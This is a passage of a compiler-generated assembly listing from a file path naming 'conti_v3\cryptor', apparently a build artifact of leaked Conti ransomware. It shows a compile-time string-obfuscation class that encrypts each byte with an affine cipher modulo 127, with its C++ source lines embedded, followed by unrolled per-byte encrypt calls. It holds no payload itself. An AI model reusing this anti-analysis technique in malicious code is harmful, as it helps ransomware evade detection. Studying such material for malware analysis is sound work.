  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv280 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
